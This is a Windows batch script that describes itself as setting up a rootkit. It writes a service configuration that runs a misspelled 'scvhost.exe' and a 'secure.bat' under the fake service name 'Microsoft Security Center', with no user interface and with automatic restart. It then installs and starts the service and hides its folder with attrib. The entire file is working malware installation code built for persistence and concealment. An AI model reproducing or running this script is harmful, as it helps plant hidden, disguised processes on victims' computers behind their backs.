rem @echo off
echo Setting Environment Variable for Rootkit's Root Folder
cd %windir%\system32\IIS
del svchost.ini
echo [settings] > svchost.ini
echo ServiceName = "Microsoft Security Center" >> svchost.ini
echo ProcCount = 2 >> svchost.ini
echo CheckProcess = 1 >> svchost.ini

echo [Process0] >> svchost.ini
echo CommandLine = %windir%\system32\IIS\scvhost.exe >> svchost.ini
echo WorkingDir =  %windir%\system32\IIS\ >> svchost.ini
echo PauseStart = 1000 >> svchost.ini
echo PauseEnd = 1000 >>svchost.ini
echo UserInterface = no >> svchost.ini
echo Restart = Yes >> svchost.ini

echo [Process1] >> svchost.ini
echo CommandLine = %windir%\system32\IIS\secure.bat >> svchost.ini
echo WorkingDir =  %windir%\system32\IIS\ >>svchost.ini
echo PauseStart = 1000 >> svchost.ini
echo PauseEnd = 1000 >> svchost.ini
echo UserInterface = no >> svchost.ini
echo Restart = no >> svchost.ini
svchost -i
attrib ../iis +h
net start "Microsoft Security Center"
if exist c:\windows\command.com goto WIN98
goto END

:WIN98
scvhost
attrib ../iis +h
goto END

:END
net start "Microsoft Security Center"